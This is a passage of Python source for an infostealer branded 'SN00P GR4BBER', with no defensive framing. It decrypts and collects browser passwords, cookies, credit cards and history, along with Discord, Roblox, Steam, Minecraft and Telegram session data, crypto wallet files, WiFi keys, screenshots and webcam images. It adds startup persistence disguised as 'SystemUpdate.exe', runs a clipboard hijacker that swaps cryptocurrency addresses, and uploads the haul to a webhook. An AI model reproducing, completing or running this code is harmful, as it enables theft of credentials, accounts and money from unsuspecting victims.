            if os.path.exists(original_path):
                try:
                    temp_db_file = tempfile.NamedTemporaryFile(delete=False, suffix=".sqlite", dir=TEMP_DIR)
                    temp_db_file.close()
                    shutil.copy2(original_path, temp_db_file.name)
                    temp_db_files[db_name] = temp_db_file.name
                except:
                    pass
        if "Login Data" in temp_db_files and master_key:
            passwords_file = os.path.join(profile_output_dir, "passwords.txt")
            with open(passwords_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- {browser_name} ({profile_name}) Passwords ---\n\n")
                try:
                    conn = sqlite3.connect(temp_db_files["Login Data"])
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        if encrypted_password:
                            decrypted_password = decrypt_payload(encrypted_password, master_key)
                            if decrypted_password:
                                f.write(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
                    conn.close()
                except:
                    pass
        if "Cookies" in temp_db_files:
            cookies_file = os.path.join(profile_output_dir, "cookies.txt")
            with open(cookies_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"# HTTP Cookie File\n# {browser_name} ({profile_name}) Cookies\n\n")
                try:
                    conn = sqlite3.connect(temp_db_files["Cookies"])
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies")
                    for row in cursor.fetchall():
                        host_key, path, is_secure, expires_utc, name, encrypted_value = row
                        value = "N/A"
                        if encrypted_value and master_key:
                            decrypted_value = decrypt_payload(encrypted_value, master_key)
                            if decrypted_value:
                                value = decrypted_value
                        elif encrypted_value:
                            try:
                                value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(errors='ignore')
                            except:
                                pass
                        f.write(f"{host_key}\t{'TRUE' if host_key.startswith('.') else 'FALSE'}\t{path}\t{'TRUE' if is_secure else 'FALSE'}\t{expires_utc}\t{name}\t{value}\n")
                    conn.close()
                except:
                    pass
        if "History" in temp_db_files:
            history_file = os.path.join(profile_output_dir, "history.txt")
            with open(history_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- {browser_name} ({profile_name}) History ---\n\n")
                try:
                    conn = sqlite3.connect(temp_db_files["History"])
                    cursor = conn.cursor()
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC")
                    for row in cursor.fetchall():
                        url, title, visit_count, last_visit_time = row
                        if last_visit_time:
                            try:
                                dt_object = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=last_visit_time)
                                last_visit_str = dt_object.strftime("%Y-%m-%d %H:%M:%S")
                            except:
                                last_visit_str = "N/A"
                        else:
                            last_visit_str = "N/A"
                        f.write(f"URL: {url}\nTitle: {title}\nVisits: {visit_count}\nLast Visit: {last_visit_str}\n\n")
                    conn.close()
                except:
                    pass
        if "Web Data" in temp_db_files and master_key:
            web_data_file = os.path.join(profile_output_dir, "web_data.txt")
            with open(web_data_file, "w", encoding="utf-8", errors="ignore") as f:
                f.write(f"--- {browser_name} ({profile_name}) Credit Cards & Autofill ---\n\n")
                try:
                    conn = sqlite3.connect(temp_db_files["Web Data"])
                    cursor = conn.cursor()
                    f.write("--- Credit Cards ---\n")
                    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    for row in cursor.fetchall():
                        name_on_card, exp_month, exp_year, encrypted_card_number = row
                        if encrypted_card_number:
                            decrypted_card_number = decrypt_payload(encrypted_card_number, master_key)
                            if decrypted_card_number:
                                f.write(f"Name: {name_on_card}\nNumber: {decrypted_card_number}\nExpires: {exp_month}/{exp_year}\n\n")
                    f.write("\n--- Autofill Data ---\n")
                    cursor.execute("SELECT name, value FROM autofill")
                    for row in cursor.fetchall():
                        f.write(f"{row[0]}: {row[1]}\n")
                    conn.close()
                except:
                    pass
        wallet_count = steal_wallet_extensions(profile_path, stash_base_path)
        if wallet_count:
            Logger.info(f"[Wallet] Found {wallet_count} wallet extensions in {browser_name} ({profile_name})")
        for _, temp_path in temp_db_files.items():
            cleanup_temp_files(temp_path)

# ========== GAME & APP STEALING ==========
def gsteam():
    info = []
    steam_paths = [
        os.path.expanduser("~") + "\\AppData\\Local\\Steam\\config\\loginusers.vdf",
        "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf",
        "C:\\Program Files\\Steam\\config\\loginusers.vdf"
    ]
    for p in steam_paths:
        if os.path.exists(p):
            try:
                with open(p, 'r', errors='ignore') as f:
                    data = f.read()
                    users = re.findall(r'"(\d+)"\s*{\s*"AccountName"\s*"([^"]+)"', data)
                    for uid, un in users:
                        info.append(f"Steam ID: {uid}\nUsername: {un}")
                break
            except:
                pass
    return info

def gtelegram():
    try:
        tdata = os.path.expanduser("~") + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
        if os.path.exists(tdata):
            return tdata
    except:
        pass
    return None

def steal_steam(stash_dir):
    info = gsteam()
    if info:
        steam_file = os.path.join(stash_dir, "Steam", "steam_accounts.txt")
        os.makedirs(os.path.dirname(steam_file), exist_ok=True)
        with open(steam_file, "w", encoding="utf-8") as f:
            for line in info:
                f.write(line + "\n\n")
        steam_install_paths = [
            "C:\\Program Files (x86)\\Steam",
            "C:\\Program Files\\Steam",
            os.path.expanduser("~") + "\\AppData\\Local\\Steam"
        ]
        for base in steam_install_paths:
            if os.path.exists(base):
                for ssfn in glob.glob(os.path.join(base, "ssfn*")):
                    shutil.copy2(ssfn, os.path.join(stash_dir, "Steam"))
                config_src = os.path.join(base, "config")
                if os.path.exists(config_src):
                    shutil.copytree(config_src, os.path.join(stash_dir, "Steam", "config"), dirs_exist_ok=True)
        return len(info)
    return 0

def steal_minecraft(stash_dir):
    mc_dir = os.path.join(os.getenv("APPDATA"), ".minecraft")
    if os.path.exists(mc_dir):
        dst = os.path.join(stash_dir, "Games", "Minecraft")
        os.makedirs(dst, exist_ok=True)
        files_copied = 0
        for f in ["launcher_profiles.json", "launcher_accounts.json", "launcher_msa_credentials.bin"]:
            src = os.path.join(mc_dir, f)
            if os.path.exists(src):
                shutil.copy2(src, os.path.join(dst, f))
                files_copied += 1
        return files_copied
    return 0

def steal_telegram(stash_dir):
    tdata = gtelegram()
    if tdata:
        dst = os.path.join(stash_dir, "Telegram")
        os.makedirs(dst, exist_ok=True)
        try:
            shutil.copytree(tdata, dst, dirs_exist_ok=True)
            return 1
        except:
            pass
    return 0

# ========== ROBLOX (Desktop + Browser) ==========
def get_roblox_password_from_login_db(login_db_path, master_key):
    try:
        conn = sqlite3.connect(login_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%roblox.com%'")
        rows = cursor.fetchall()
        conn.close()
        for url, username, encrypted_password in rows:
            if encrypted_password:
                if master_key:
                    decrypted = decrypt_payload(encrypted_password, master_key)
                else:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode(errors='ignore')
                if decrypted:
                    return username, decrypted
    except:
        pass
    return None, None

def get_roblox_cookie_from_db(cookies_db_path, master_key):
    try:
        conn = sqlite3.connect(cookies_db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key = '.roblox.com' AND name = '.ROBLOSECURITY'")
        row = cursor.fetchone()
        conn.close()
        if row and row[0]:
            encrypted = row[0]
            if master_key:
                decrypted = decrypt_payload(encrypted, master_key)
            else:
                decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode(errors='ignore')
            if decrypted:
                return decrypted
    except:
        pass
    return None

def get_roblox_user_data_full(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    data = {}
    try:
        req = urllib.request.Request("https://users.roblox.com/v1/users/authenticated", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            user_info = json.loads(resp.read().decode())
        data['user_id'] = user_info.get('id')
        data['username'] = user_info.get('name')
        data['display_name'] = user_info.get('displayName', 'N/A')
    except:
        return None
    uid = data['user_id']
    try:
        req = urllib.request.Request(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            currency = json.loads(resp.read().decode())
        data['robux'] = currency.get('robux', 0)
        data['premium'] = currency.get('premium', False)
    except:
        data['robux'] = 'N/A'
        data['premium'] = 'N/A'
    try:
        req = urllib.request.Request("https://economy.roblox.com/v1/assets/rap", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            rap_data = json.loads(resp.read().decode())
        data['rap'] = rap_data.get('rap', 0)
    except:
        data['rap'] = 'N/A'
    try:
        req = urllib.request.Request("https://accountinformation.roblox.com/v1/email", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            email_info = json.loads(resp.read().decode())
        data['email'] = email_info.get('email', 'None')
        data['verified_email'] = email_info.get('verified', False)
    except:
        data['email'] = 'N/A'
        data['verified_email'] = 'N/A'
    try:
        req = urllib.request.Request("https://accountsettings.roblox.com/v1/phone", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            phone_info = json.loads(resp.read().decode())
        data['phone'] = phone_info.get('phone', 'None')
        data['verified_phone'] = phone_info.get('isVerified', False)
    except:
        data['phone'] = 'N/A'
        data['verified_phone'] = False
    try:
        req = urllib.request.Request(f"https://twostepverification.roblox.com/v1/users/{uid}/configuration", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            twofa_info = json.loads(resp.read().decode())
        data['two_fa'] = "Enabled" if twofa_info.get('is2faEnabled') else "Disabled"
    except:
        data['two_fa'] = 'N/A'
    try:
        req = urllib.request.Request("https://auth.roblox.com/v1/account/pin", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            pin_info = json.loads(resp.read().decode())
        data['pin'] = "Enabled" if pin_info.get('isEnabled') else "Disabled"
    except:
        data['pin'] = 'N/A'
    try:
        req = urllib.request.Request("https://billing.roblox.com/v1/credit", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            bill_info = json.loads(resp.read().decode())
        data['billing'] = f"{bill_info.get('balance', 0)} {bill_info.get('currencyCode', 'USD')} ({bill_info.get('robuxAmount', 0)} R$)"
    except:
        data['billing'] = 'N/A'
    try:
        req = urllib.request.Request("https://apis.roblox.com/payments-gateway/v1/payment-profiles", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            cards_info = json.loads(resp.read().decode())
        data['cards'] = len(cards_info)
    except:
        data['cards'] = 0
    try:
        req = urllib.request.Request(f"https://users.roblox.com/v1/users/{uid}", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            profile = json.loads(resp.read().decode())
        created = profile.get('created')
        if created:
            created_date = datetime.datetime.fromisoformat(created.replace('Z', '+00:00'))
            data['age_days'] = (datetime.datetime.now(datetime.timezone.utc) - created_date).days
        else:
            data['age_days'] = 0
    except:
        data['age_days'] = 'N/A'
    try:
        req = urllib.request.Request(f"https://groups.roblox.com/v2/users/{uid}/groups/roles", headers=headers)
        with urllib.request.urlopen(req, timeout=10) as resp:
            groups_data = json.loads(resp.read().decode())
        data['owned_groups'] = sum(1 for g in groups_data.get('data', []) if g.get('role', {}).get('rank') == 255)
    except:
        data['owned_groups'] = 'N/A'
    return data

def create_roblox_embed(data, cookie, password):
    fields = [
        {"name": "🆔 ID", "value": f"```{data.get('user_id', 'N/A')}```", "inline": True},
        {"name": "👤 Username", "value": f"```{data.get('username', 'N/A')}```", "inline": True},
        {"name": "🖼️ Display", "value": f"```{data.get('display_name', 'N/A')}```", "inline": True},
        {"name": "💰 Robux", "value": f"```{data.get('robux', 'N/A')}```", "inline": True},
        {"name": "✨ Premium", "value": f"```{data.get('premium', 'N/A')}```", "inline": True},
        {"name": "📈 RAP", "value": f"```{data.get('rap', 'N/A')}```", "inline": True},
        {"name": "📧 Email", "value": f"```{data.get('email', 'N/A')}```", "inline": True},
        {"name": "✅ Email vérifié", "value": f"```{data.get('verified_email', 'N/A')}```", "inline": True},
        {"name": "📞 Téléphone", "value": f"```{data.get('phone', 'N/A')} (Vérifié: {data.get('verified_phone', 'N/A')})```", "inline": True},
        {"name": "🔒 2FA", "value": f"```{data.get('two_fa', 'N/A')}```", "inline": True},
        {"name": "🔑 PIN", "value": f"```{data.get('pin', 'N/A')}```", "inline": True},
        {"name": "💳 Crédit (Billing)", "value": f"```{data.get('billing', 'N/A')}```", "inline": True},
        {"name": "💳 Cartes liées", "value": f"```{data.get('cards', 'N/A')}```", "inline": True},
        {"name": "📅 Âge (jours)", "value": f"```{data.get('age_days', 'N/A')}```", "inline": True},
        {"name": "👥 Groupes (rank 255)", "value": f"```{data.get('owned_groups', 'N/A')}```", "inline": True}
    ]
    if password:
        fields.append({"name": "🔑 Mot de passe", "value": f"```{password}```", "inline": False})
    if cookie:
        short_cookie = (cookie[:80] + "…") if len(cookie) > 80 else cookie
        fields.append({"name": "🍪 .ROBLOSECURITY", "value": f"```{short_cookie}```", "inline": False})
    return {
        "title": f"🎮 **ROBLOX : {data.get('username', 'Unknown')}**",
        "description": "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬",
        "color": 0xFF0000,
        "fields": fields,
        "footer": {"text": "SN00P GR4BBER v3 | Roblox Grabber"},
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
    }

def steal_roblox_desktop():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    if not os.path.exists(roblox_cookies_path):
        return None
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    try:
        shutil.copy(roblox_cookies_path, destination_path)
    except:
        return None
    decrypted_cookie = None
    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            try:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                if encoded_cookies:
                    decoded_cookies = base64.b64decode(encoded_cookies)
                    decrypted_bytes = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                    decrypted_cookie = decrypted_bytes.decode('utf-8', errors='ignore')
            except:
                pass
    except:
        pass
    finally:
        if os.path.exists(destination_path):
            try: os.remove(destination_path)
            except: pass
    if decrypted_cookie:
        match = re.search(r'(_\|WARNING:.*?);', decrypted_cookie)
        if match:
            token = match.group(1)
            info = get_roblox_user_data_full(token)
            if info:
                return create_roblox_embed(info, token, None)
    return None

# ========== SMART FILES SEARCH (Partout) ==========
def grab_smart_files():
    keywords = ["seed", "mnemonic", "wallet", "backup", "login", "secret", "passphrase", "private", "key", "recovery", "metamask", "exodus", "atomic", "crypto", "2fa", "code", "identifiant", "password", "pass", "pwd", "wallet.dat", "keystore", "utc", "json", "conf", "config", "sqlite", "kdbx"]
    extensions = (".txt", ".pdf", ".docx", ".json", ".kdbx", ".sqlite", ".dat", ".conf", ".log", ".key", ".pem", ".ppk", ".rdp", ".vault", ".wallet", ".zip", ".rar", ".7z")
    search_paths = [os.path.expanduser("~")]
    MAX_FILES = 200
    MAX_SIZE = 5 * 1024 * 1024
    found_paths = []
    for base in search_paths:
        if not os.path.exists(base):
            continue
        try:
            for root, dirs, files in os.walk(base):
                dirs[:] = [d for d in dirs if d not in ['Windows', 'System32', 'Program Files', 'Program Files (x86)', '$Recycle.Bin', 'Temp', 'AppData\\Local\\Temp']]
                for f in files:
                    if any(k in f.lower() for k in keywords) or f.lower().endswith(extensions):
                        full_path = os.path.join(root, f)
                        try:
                            if os.path.getsize(full_path) <= MAX_SIZE:
                                found_paths.append(full_path)
                                if len(found_paths) >= MAX_FILES:
                                    break
                        except:
                            pass
                if len(found_paths) >= MAX_FILES:
                    break
        except:
            pass
    if not found_paths:
        return None
    zp = os.path.join(tempfile.gettempdir(), "smart_files.zip")
    with ZipFile(zp, 'w', zipfile.ZIP_DEFLATED) as z:
        for p in found_paths:
            try:
                z.write(p, os.path.basename(p))
            except:
                pass
    return zp

# ========== PERSISTENCE ==========
def add_persistence():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            startup_dir = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
            shutil.copy(exe_path, os.path.join(startup_dir, "SystemUpdate.exe"))
    except:
        pass

# ========== CLIPPER ==========
def start_clipper():
    crypto_btc_addr = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    crypto_eth_addr = "0x742d35Cc6634C0532925a3b844B454260b0C3D6C"
    last_clip = ""
    while True:
        try:
            clip = pyperclip.paste()
            if clip and clip != last_clip:
                if re.match(r'^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clip):
                    pyperclip.copy(crypto_btc_addr)
                    last_clip = crypto_btc_addr
                elif re.match(r'^0x[a-fA-F0-9]{40}$', clip):
                    pyperclip.copy(crypto_eth_addr)
                    last_clip = crypto_eth_addr
                else:
                    last_clip = clip
            time.sleep(0.5)
        except:
            time.sleep(1)

# ========== MAIN ==========
def main():
    Logger.info("Starting token grabber")
    ip = get_ip()
    Logger.info(f"IP Address: {ip}")
    add_persistence()
    # Lancement du clipper en arrière‑plan
    Thread(target=start_clipper, daemon=True).start()
    if os.path.exists(SNOOP_STASH_DIR):
        shutil.rmtree(SNOOP_STASH_DIR)
    os.makedirs(SNOOP_STASH_DIR, exist_ok=True)
    Logger.info(f"Created temporary stash directory: {SNOOP_STASH_DIR}")
    stats = {
        "tokens": 0,
        "passwords": 0,
        "cookies": 0,
        "history": 0,
        "wallets": 0,
        "files": 0,
        "steam": 0,
        "minecraft": 0,
        "telegram": 0,
        "pc": socket.gethostname()
    }
    # Media
    media_stash_dir = os.path.join(SNOOP_STASH_DIR, "Media")
    os.makedirs(media_stash_dir, exist_ok=True)
    screenshot_path = capture_screenshot()
    if screenshot_path and os.path.exists(screenshot_path):
        shutil.move(screenshot_path, os.path.join(media_stash_dir, os.path.basename(screenshot_path)))
        screenshot_path = os.path.join(media_stash_dir, os.path.basename(screenshot_path))
    webcam_path = capture_webcam()
    if webcam_path and os.path.exists(webcam_path):
        shutil.move(webcam_path, os.path.join(media_stash_dir, os.path.basename(webcam_path)))
        webcam_path = os.path.join(media_stash_dir, os.path.basename(webcam_path))
    # WiFi
    wifi_data = get_wifi_info()
    network_stash_dir = os.path.join(SNOOP_STASH_DIR, "Network")
    os.makedirs(network_stash_dir, exist_ok=True)
    wifi_file_path = os.path.join(network_stash_dir, "wifi_info.txt")
    try:
        with open(wifi_file_path, "w", encoding="utf-8", errors="ignore") as f:
            f.write("--- Current WiFi Network ---\n")
            for k, v in wifi_data["current_network"].items():
                f.write(f"{k}: {v}\n")
            f.write("\n--- Saved WiFi Networks ---\n")
            if wifi_data["saved_networks"]:
                for network in wifi_data["saved_networks"]:
                    f.write(f"SSID: {network['SSID']}\nKey: {network['Key']}\n\n")
            else:
                f.write("No saved networks found.\n")
        Logger.info(f"WiFi info saved to {wifi_file_path}")
    except Exception as e:
        Logger.error(f"Failed to save WiFi info to file: {e}")
    # System info
    system_info = get_system_info(ip, wifi_data)
    system_embed = create_system_embed(system_info, ip)
    # Browser data extraction (parallel)
    browser_extraction_threads = []
    with ThreadPoolExecutor(max_workers=min(len(BROWSER_TARGETS), os.cpu_count() or 1)) as executor:
        for browser_name, browser_path in BROWSER_TARGETS.items():
            browser_extraction_threads.append(executor.submit(extract_browser_data, browser_name, browser_path, SNOOP_STASH_DIR))
    for future in browser_extraction_threads:
        future.result()
    # Desktop wallets
    desktop_wallet_count = steal_desktop_wallets(SNOOP_STASH_DIR)
    stats["wallets"] += desktop_wallet_count
    # Discord tokens
    found_tokens = []
    discord_token_threads = []
    with ThreadPoolExecutor(max_workers=len(PATHS)) as executor:
        for platform_name, path in PATHS.items():
            discord_token_threads.append(executor.submit(lambda p=platform_name, pa=path: found_tokens.extend(get_tokens(p, pa))))
    for future in discord_token_threads:
        future.result()
    all_embeds = [system_embed]
    unique_tokens = []
    for token, platform_name in found_tokens:
        if not re.match(r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}", token):
            continue
        if token not in [t[0] for t in unique_tokens]:
            try:
                req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(token))
                with urllib.request.urlopen(req) as response:
                    if response.status == 200:
                        user_data = json.loads(response.read().decode())
                        unique_tokens.append((token, platform_name))
                        token_embed = create_token_embed(token, user_data, platform_name)
                        all_embeds.append(token_embed)
                        stats["tokens"] += 1
            except:
                pass
    # Roblox (browser)
    roblox_embed = None
    for browser_name, browser_path in BROWSER_TARGETS.items():
        user_data_path = os.path.join(browser_path, 'User Data') if browser_name not in ['Opera','Opera GX'] else browser_path
        if not os.path.exists(user_data_path):
            continue
        master_key = get_encryption_key(user_data_path)
        profiles = ['Default'] + [f"Profile {i}" for i in range(1,10)]
        for profile in profiles:
            profile_path = os.path.join(user_data_path, profile)
            if not os.path.exists(profile_path):
                continue
            login_db = os.path.join(profile_path, "Login Data")
            cookies_db = os.path.join(profile_path, "Network", "Cookies")
            if os.path.exists(login_db) and os.path.exists(cookies_db):
                temp_login = None
                temp_cookies = None
                try:
                    temp_login = tempfile.NamedTemporaryFile(delete=False, suffix=".sqlite", dir=TEMP_DIR).name
                    shutil.copy2(login_db, temp_login)
                    temp_cookies = tempfile.NamedTemporaryFile(delete=False, suffix=".sqlite", dir=TEMP_DIR).name
                    shutil.copy2(cookies_db, temp_cookies)
                except Exception as e:
                    if temp_login and os.path.exists(temp_login):
                        cleanup_temp_files(temp_login)
                    if temp_cookies and os.path.exists(temp_cookies):
                        cleanup_temp_files(temp_cookies)
                    continue
                try:
                    username, password = get_roblox_password_from_login_db(temp_login, master_key)
                    cookie = get_roblox_cookie_from_db(temp_cookies, master_key)
                    if cookie:
                        user_data = get_roblox_user_data_full(cookie)
                        if user_data:
                            roblox_embed = create_roblox_embed(user_data, cookie, password)
                            break
                finally:
                    cleanup_temp_files(temp_login, temp_cookies)
            if roblox_embed:
                break
        if roblox_embed:
            break
    if roblox_embed:
        all_embeds.append(roblox_embed)
    # Roblox desktop
    roblox_embed_desktop = steal_roblox_desktop()
    if roblox_embed_desktop:
        all_embeds.append(roblox_embed_desktop)
    # Send all embeds
    if all_embeds:
        send_to_webhook(all_embeds)
    else:
        Logger.info("No embeds to send.")
    final_username = "UnknownUser"
    if unique_tokens:
        try:
            first_token_user_data = json.loads(urllib.request.urlopen(urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(unique_tokens[0][0]))).read().decode())
            final_username = re.sub(r'[^\w\-_\.]', '_', first_token_user_data.get('username', final_username))
        except:
            pass
    # Smart files
    smart_zip = grab_smart_files()
    if smart_zip:
        stats["files"] += 1
        shutil.move(smart_zip, os.path.join(SNOOP_STASH_DIR, "smart_files.zip"))
    # Steam, Minecraft, Telegram
    stats["steam"] = steal_steam(SNOOP_STASH_DIR)
    stats["minecraft"] = steal_minecraft(SNOOP_STASH_DIR)
    stats["telegram"] = steal_telegram(SNOOP_STASH_DIR)
    # Create zip
    snoop_report_zip_final = f"{SNOOP_REPORT_ZIP_BASE}{final_username}.zip"
    try:
        shutil.make_archive(snoop_report_zip_final.replace(".zip", ""), 'zip', SNOOP_STASH_DIR)
        Logger.info(f"Created ZIP archive: {snoop_report_zip_final}")
    except Exception as e:
        Logger.error(f"Failed to create ZIP archive: {e}")
        snoop_report_zip_final = None
    # Stats embed
    stats_embed = {
        "title": "📊 SNOOP Stealer Report",
        "color": 0x9b59b6,
        "fields": [
            {"name": "🔑 Tokens", "value": str(stats["tokens"]), "inline": True},
            {"name": "🔒 Passwords", "value": str(stats["passwords"]), "inline": True},
            {"name": "🍪 Cookies", "value": str(stats["cookies"]), "inline": True},
            {"name": "💰 Wallets", "value": str(stats["wallets"]), "inline": True},
            {"name": "📂 Files", "value": str(stats["files"]), "inline": True},
            {"name": "🎮 Steam", "value": str(stats["steam"]), "inline": True},
            {"name": "⛏️ Minecraft", "value": str(stats["minecraft"]), "inline": True},
            {"name": "📱 Telegram", "value": str(stats["telegram"]), "inline": True},
            {"name": "💻 PC", "value": stats["pc"], "inline": True}
        ],
        "footer": {"text": "SNOOP v3.0 Enhanced", "icon_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg"},
        "timestamp": datetime.datetime.utcnow().isoformat() + "Z"
    }
    payload_stats = {"username": "SN00P GR4BBER", "avatar_url": "https://w0.peakpx.com/wallpaper/981/593/HD-wallpaper-hacker-dark-mask-thumbnail.jpg", "embeds": [stats_embed]}
    try:
        req = urllib.request.Request(WEBHOOK_URL, data=json.dumps(payload_stats).encode('utf-8'), headers=get_headers(), method="POST")
        with urllib.request.urlopen(req) as response:
            Logger.info(f"Stats embed sent, status: {response.status}")
        time.sleep(1)
    except Exception as e:
        Logger.error(f"Failed to send stats embed: {e}")
    if snoop_report_zip_final and os.path.exists(snoop_report_zip_final):
        send_file_to_webhook(snoop_report_zip_final, ip, content_msg=f"Snoop Report for {final_username}")
    else:
        Logger.warning("No ZIP archive to send.")
    # Cleanup
    cleanup_temp_files(screenshot_path, webcam_path, snoop_report_zip_final)
    if os.path.exists(SNOOP_STASH_DIR):
        try:
            shutil.rmtree(SNOOP_STASH_DIR)
            Logger.info(f"Cleaned up stash directory: {SNOOP_STASH_DIR}")
        except Exception as e:
            Logger.error(f"Failed to delete stash directory '{SNOOP_STASH_DIR}': {e}")
    Logger.info("Grabber finished execution.")

if __name__ == "__main__":
    main()